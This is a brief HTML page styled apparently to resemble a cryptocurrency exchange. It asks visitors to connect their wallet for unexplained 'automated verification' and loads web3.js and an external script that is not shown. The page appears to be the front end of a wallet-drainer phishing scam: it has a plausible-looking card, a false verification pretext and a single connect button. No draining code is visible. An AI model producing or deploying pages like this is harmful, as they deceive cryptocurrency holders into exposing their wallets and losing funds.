<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Asset Verification</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
    <style>
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
        .card { background: #1e2329; padding: 30px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); width: 90%; max-width: 350px; }
        h2 { color: #f0b90b; }
        p { color: #929aa5; font-size: 14px; }
        .btn { background: #f0b90b; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        .btn:disabled { background: #474d57; opacity: 0.6; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Verify Assets</h2>
        <p>Connect your wallet to proceed with automated verification.</p>
        <button id="nextBtn" class="btn">Connect Wallet</button>
    </div>
    <script src="script.js"></script>
</body>
</html>
